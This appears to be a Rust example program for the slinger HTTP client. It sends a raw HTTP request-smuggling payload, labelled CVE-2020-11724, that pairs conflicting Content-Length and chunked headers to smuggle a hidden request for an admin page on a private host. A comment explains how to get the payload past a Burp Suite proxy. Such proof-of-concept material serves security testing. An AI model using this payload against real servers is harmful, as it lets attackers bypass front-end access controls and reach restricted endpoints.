use slinger::ClientBuilder;
use std::io::BufRead;

/// CVE-2020-11724
/// when you're using BurpSuite proxy need **disabled** "set **Connection** header on incoming request"
const RAW: &[u8] = b"GET /test1 HTTP/1.1
Host: 192.168.83.196:8081
Content-Length: 42
Transfer-Encoding: chunked

0

GET /test1 HTTP/1.1
Host: 192.168.83.196:8081
X: GET http://192.168.83.1:8080/admin.jsp HTTP/1.0

";

fn main() -> Result<(), Box<dyn std::error::Error>> {
  // let proxy = slinger::Proxy::parse("http://127.0.0.1:8080").unwrap();
  let client = ClientBuilder::new().build().unwrap();
  let mut raw = Vec::new();
  // replace \n to \r\n
  for line in RAW.lines() {
    match line {
      Ok(l) => {
        raw.extend(l.as_bytes());
        raw.extend(b"\r\n")
      }
      Err(err) => {
        println!("{:?}", err);
      }
    }
  }
  let resp = client.raw("http://127.0.0.1:9015/", raw, true).send()?;
  let record = resp.http_record().unwrap();
  println!("{:?}", record[0].request);
  let command = resp.request().unwrap().get_command();
  println!("{}", command);
  Ok(())
}
